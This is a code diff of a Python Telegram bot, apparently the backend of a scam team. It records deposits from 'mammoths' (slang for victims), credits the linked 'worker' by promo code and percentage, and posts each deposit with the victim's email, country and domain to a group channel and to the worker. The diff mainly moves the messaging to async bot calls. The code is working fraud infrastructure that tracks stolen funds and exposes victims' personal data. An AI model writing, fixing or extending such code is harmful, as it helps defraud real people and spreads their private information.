@@ -260,26 +260,21 @@ def country_code_to_flag(country_code):
     return chr(code_points[0]) + chr(code_points[1])
 
 
-def send_newDeposit(data: dict):
-    
-    months = [
-        "января", "февраля", "марта", "апреля", "мая", "июня", 
-        "июля", "августа", "сентября", "октября", "ноября", "декабря"
-    ]
+async def send_newDeposit(data: dict):
     today = datetime.now()
-    day = today.day
-    month = months[today.month - 1]
-    year = today.year
-    formatted_date = f"{day} {month} {year} г."
 
     cursor.execute(f"SELECT user_id FROM promocodes WHERE name = ?", (data['mammothPromo'], ))
-    worker_id = cursor.fetchone()[0]
-    worker_username = DB.get(user_id=worker_id, data="username", table=DB.users_table)
-    worker_perc = DB.get(user_id=worker_id, data="percentage", table=DB.users_table)
+    worker_id = cursor.fetchone()[0] #Получил user_id по промокоду
+    
+    worker_username = DB.get(user_id=worker_id, data="username", table=DB.users_table) #Username воркера получил
+    worker_perc = DB.get(user_id=worker_id, data="percentage", table=DB.users_table) #Процент воркера получил
+    
     cursor.execute(f"SELECT activation_count FROM promocodes WHERE name = ?", (data['mammothPromo'], ))
-    old_promo_activations = cursor.fetchone()[0]
+    old_promo_activations = cursor.fetchone()[0] # Получил колличество активаций промо по промокоду activation_count
+    
     cursor.execute(f"SELECT deposit FROM promocodes WHERE name = ?", (data['mammothPromo'], ))
-    old_promo_deposits = cursor.fetchone()[0]
+    old_promo_deposits = cursor.fetchone()[0] # хуй пойми че это ну наверное старое колличество депов на промике
+    
     old_worker_balance = DB.get(user_id=worker_id, data="balance", table=DB.users_table)
     old_worker_all_time_balance = DB.get(user_id=worker_id, data="all_time_balance", table=DB.users_table)
     old_bot_all_time_balance = DB.get_without_user_id(data="all_time_balance", table=DB.bot_info)
@@ -304,9 +299,11 @@ def send_newDeposit(data: dict):
     # Загружаем данные в БД
     DB.update(user_id=worker_id, column="balance", new_data=new_worker_balance, table=DB.users_table)
     DB.update(user_id=worker_id, column="all_time_balance", new_data=new_worker_all_time_balance, table=DB.users_table)
+    
     DB.update_without_user_id(column="all_time_balance", new_data=new_bot_all_time_balance, table=DB.bot_info)
     DB.update_without_user_id(column="promo_activations", new_data=new_bot_all_promo_activations, table=DB.bot_info)
     DB.update_without_user_id(column="deposits", new_data=new_bot_deposits, table=DB.bot_info)
+    
     
     cursor.execute(f"UPDATE promocodes SET activation_count = ? WHERE name = ?", (new_promo_activations, data['mammothPromo']))
     cursor.execute(f"UPDATE promocodes SET deposit = ? WHERE name = ?", (new_promo_deposits, data['mammothPromo']))
@@ -316,65 +313,35 @@ def send_newDeposit(data: dict):
     cursor.execute(
             'INSERT INTO deposits (worker_id, amount, mamonth_login, token, domain, date, hash, country, amountUSD)'
             'VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
-            (worker_id, float(data['amount']), str(data["mammothLogin"]), str(data["token"]), str(data["domain"]), formatted_date, str(data["txHash"]), str(data["mammothCountry"]), str(data["amountUsd"])))
+            (worker_id, float(data['amount']), str(data["mammothLogin"]), str(data["token"]), str(data["domain"]), today, str(data["txHash"]), str(data["mammothCountry"]), str(data["amountUsd"])))
 
     conn.commit()
 
-    # Формируем сообщение для отправки
-    text = f"""
+    message_to_channel = f"""
 <b>🔥 Хо-хо-хо! Новый депозит!
-├🦋Никнейм воркера: <code>{worker_username}</code>
+├🦋Никнейм воркера: <code>{worker_username if worker_username else '*****'}</code>
 └❄️Сумма депозита: <code>{data['amountUsd']} $</code></b>
         """
     
-    # Формируем URL запроса
-    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-
-    # Формируем параметры запроса
-    params = {
-    "chat_id": GROUP_ID,
-    "text": text,
-    "parse_mode": 'HTML'
-    }
-
-    # Отправляем запрос и получаем ответ
-    response = requests.post(url, params=params)
-    # asyncio.run(bot.send_message(chat_id=GROUP_ID, text=text))
-    if response.status_code == 200:
-        logger.info(f"newDeposit: msg successfully sended")
-    else:
-        logger.error(f"newDeposit: Error while sending msg: {response.content}")
+    await bot.send_message(
+        chat_id=GROUP_ID,
+        text=message_to_channel,
+        parse_mode='HTML'
+    )
     
-    #asyncio.run(send_dep_user(worker_id, data['amountUsd'], data['domain']))
-    #worker_id
-    send_dep_user(worker_id, data['amountUsd'], data['domain'])
-    
-
-def send_dep_user(worker_id, ammount, domain):
-    # Формируем URL запроса
-    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-
-
-    text=f'''
+    message_to_user = f'''
 <b>🔥 Хо-хо-хо! Вам пришел депозит!
-├❄️Сумма: <code>{ammount}$</code>
-└🔐Домен: <code>{domain}</code></b>
+├❄️Сумма: <code>{data['amountUsd']}$</code>
+├❄️Почта мамонта: <code>{data['mammothLogin']}$</code>
+├❄️Страна: <code>{data['mammothCountry']}$</code>
+└🔐Домен: <code>{data['domain']}</code></b>
 '''
-        # Формируем параметры запроса
-    params = {
-    "chat_id": worker_id,
-    "text": text,
-    "parse_mode": 'HTML'
-    }
-
-    # Отправляем запрос и получаем ответ
-    response = requests.post(url, params=params)
-    if response.status_code == 200:
-        logger.info(f"newDeposit: msg successfully sended")
-    else:
-        logger.error(f"newDeposit: Error while sending msg: {response.content}")
-
-
+    await bot.send_message(
+        chat_id=worker_id,
+        text=message_to_user,
+        parse_mode='HTML'
+    )
+    
 def create_top_list():
     users_list = []
     users = DB.get_all(data="user_id", table=DB.users_table)
